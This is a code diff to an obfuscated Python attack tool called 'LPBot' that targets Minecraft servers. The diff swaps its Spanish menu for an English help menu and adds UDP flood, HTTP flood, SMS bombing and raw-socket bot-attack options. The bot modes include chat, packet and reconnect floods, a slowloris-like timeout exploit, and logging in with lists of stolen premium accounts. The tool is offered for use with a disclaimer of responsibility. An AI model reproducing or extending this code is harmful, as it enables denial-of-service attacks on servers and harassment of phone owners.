@@ -22,6 +22,44 @@ import os
 os .system ("clear")
 fecha =datetime .datetime .now ()
 
+
+
+def ayuda():
+	print("Help Menu")
+	print("=========")
+	print("")
+	print("    Command               Description                       ")
+	print("    -------               -----------                       ")
+	print("    Stop                  Kill this session                 ")
+	print("    Ping                  TCP ping to IP:PORT               ")
+	print("    Scan                  Perform TCP scan                  ")
+	print("    Bots                  Bot ATTACK (1.8 - 1.X.X)          ")
+	print("    HTTP Flood            HTTP Exploit (L7 FLood)           ")
+	print("    UDP Flood             UDP Flood (L4 Flood)              ")
+	print("    SMS Bombing           US Only (Via EMAIL)               ")
+	print("")
+	eleccion =raw_input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
+	if (eleccion =="Stop"):
+	    synckill('')
+	if (eleccion =="Ping"):
+	    ping ()
+	if (eleccion =="Scan"):
+	    nmap ()
+	if (eleccion =="Bots"):
+	    bots ()
+	if (eleccion =="HTTP Flood"):
+	    exploit ()
+	if (eleccion =='UDP Flood'):
+	    UDP()
+	if (eleccion =='SMS Bombing'):
+		sms()
+
+
+	
+	
+def UDP():
+    os.system("sudo python UDP.py")
+	
 def sms ():
     os .system ("sudo python LPSMSBomber.py")
 
@@ -37,16 +75,19 @@ def ping ():
     os .system ("sudo python2 LPing.py "+str (O0O0O0O0O0O00O0OO ))
 def bots ():
     print ("")
-    print (" - :::::Version::::: ")
-    print ("1 - .: 1.8 - 1.8.9 :.")
-    print ("2 - .:: 1.9 ::.")
-    print ("3 - .::: 1.9.1 :::.")
-    print ("4 - .::: 1.9.2 :::.")
-    print ("5 - .:: 1.9.3 - 1.9.4 ::.")
-    print ("6 - .: 1.10 :.")
+    print ("Bot Attack")
+    print ("==========")
     print ("")
-    print ("7 - .::: Custom protocol :::.")
-    print ("")
+    print("    Command               Description           ")
+    print("    -------               -----------           ")
+    print("      1                   Version 1.8 - 1.8.9   ")
+    print("      2                   Version 1.9           ")
+    print("      3                   Version 1.9.1         ")
+    print("      4                   Version 1.9.2         ")
+    print("      5                   Version 1.9.3 - 1.9.4 ")
+    print("      6                   Version 1.10          ")
+    print("      7                   Custom Protocol       ")
+    print("")
     O0OOO0OO00OO00OO0 =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
     if O0OOO0OO00OO00OO0 ==1 :
         OOOOO0O0OOO00O00O =47
@@ -81,7 +122,7 @@ def bots ():
         print("[LPBot] Listo! " + str(ipresolved))
         ipnueva = raw_input("[LPBot] Deseas utilizar la ip numerica como objetivo? (y/n): ")
         if ipnueva == 'y':
-            O0OOOO0O0O0000O0O = raw_input ('\033[1;32;40m[-] IP (Incluye IP:PUERTO): ')
+            O0OOOO0O0O0000O0O = raw_input ('\033[1;32;40m[LPBot] IP (Incluye IP:PUERTO): ')
     if (O0OOOO0O0O0000O0O in OOO0O00OO0000O00O ):
         synckill ('\n\033[1;31;40m[!] IP Blacklisted!')
     O00000O0OO00OOO0O =input ('\033[1;32;40m[-] Sesiones: ')
@@ -102,16 +143,19 @@ def bots ():
         sys .exit ()
     OOOOO00OOOOO0O00O .setsockopt (socket .IPPROTO_IP ,socket .IP_HDRINCL ,1 )
     print ("")
-    print ("\033[1;37;40m[i] Modos disponibles (BETA)")
-    print ("")
-    print ("\033[1;37;40m1 - Item Flood\t - Dropear items aleatoriamente (Creativo REQUERIDO)")
-    print ("\033[1;37;40m2 - Chat flood\t\t - Spammear un mensaje")
-    print ("\033[1;37;40m3 - Flood de Reconexion \t - Spammear consola entrando y saliendo!")
-    print ("\033[1;37;40m4 - Packet flood\t - Mandar sockets excesivos")
-    print ("\033[1;37;40m5 - Timeout Exploit\t\t - Dejar de mandar paquetes al inciar sesion (similar a slowloris)")
-    print ("\033[1;37;40m6 - \xc2\xa0Basic \t\t - Llenar el servidor")
-    print
-    OOOO00OOO00O0OOOO =input ('\033[1;32;40m[!] MODO: ')
+    print("Methods")
+    print("=========")
+    print("")
+    print("    Command               Description                              ")
+    print("    -------               -----------                              ")
+    print("      1                   Drop Items (Creative Needed)              ")
+    print("      2                   Chat Flood - Spam a message               ")
+    print("      3                   Reconnect Flood - Join and leave spam     ")
+    print("      4                   Packet Flood - Send sockets continously   ")
+    print("      5                   Timeout Exploit - Jessica A-like          ")
+    print("      6                   Basic - Join and stay                     ")
+    print("")
+    OOOO00OOO00O0OOOO =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$  ')
     if OOOO00OOO00O0OOOO ==1 :
         O000O0O0O0000000O =True
         OO0OO0OOOO0O0OO00 =False
@@ -167,14 +211,16 @@ def bots ():
         OOOO0O0OOOO00O000 =''
         O00000OO00O0O0O0O =False
     print ("")
-    print ("\033[1;32;40m[!] Modos Disponibles: ")
-    print ("")
-    print ("\033[1;37;40m1 - Cuentas Premium\t - Formato (email:password) para servidores premium")
-    print ("\033[1;37;40m2 - Random\t - Random nicks con prefijo")
-    print ("\033[1;37;40m3 - Lista\t - Utilizar nicks de una lista (.txt)")
-    print ("\033[1;37;40m4 - Estatico\t - Utilizar unicamente un nick")
-    print ("")
-    print ("\033[1;32;40m[!] Selecciona un MODO: ")
+    print("Nick formatting")
+    print("===============")
+    print("")
+    print("    Command               Description                               ")
+    print("    -------               -----------                               ")
+    print("      1                   Premium Accounts (From .txt)              ")
+    print("      2                   Random (Generated)                        ")
+    print("      3                   List (From List.txt)                      ")
+    print("      4                   Static (Only One Nickname)                ")
+    print("")
     O00000OOO0O0O0OOO =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
     if O00000OOO0O0O0OOO ==1 :
         OOOOO0000OO00000O ='alts'
@@ -309,31 +355,7 @@ def bots ():
             time .sleep (1000 )
     except (KeyboardInterrupt ,SystemExit ):
         synckill ('\n\033[1;31;40m[!] Deteniendo con exito!')
-print ("______________________________________________________")
-print (" Welcome to LPBot // "+str (fecha ))
-print ("______________________________________________________")
-print ("")
-print (" 1 - Escaneo                  - Escanea una IP utilizando NMAP")
-print (" 2 - Ping (Puerto TCP)        - Pinguea una IP:PUERTO utilizando paquetes TCP")
-print (" 3 - Bots                     - Bots para minecraft (1.8 - 1.x.x)")
-print (" 4 - HTTPExploit (BungeeCord) - Floodea BC con paquetes HTTP a IP:25565 (Layer 7)")
-print (" 5 - SMS Bomber (Only US)     - SMS bombing a un telefono de USA ")
-print ("")
-print (" 6 - Salir")
-print ("______________________________________________________")
-print ("")
-print("## NO NOS HACEMOS RESPONSABLES DE TUS ACTOS // May the fun BEGIN")
-print("")
-eleccion =input ("Opción [1-5]: ")
-if (eleccion ==1 ):
-    nmap ()
-if (eleccion ==2 ):
-    ping ()
-if (eleccion ==3 ):
-    bots ()
-if (eleccion ==4 ):
-    exploit ()
-if (eleccion ==5 ):
-    sms()
-if (eleccion ==6 ):
-    synckill ('\n\033[1;31;40m[!] Que tenga un buen dia!')
+
+
+ayuda()
+
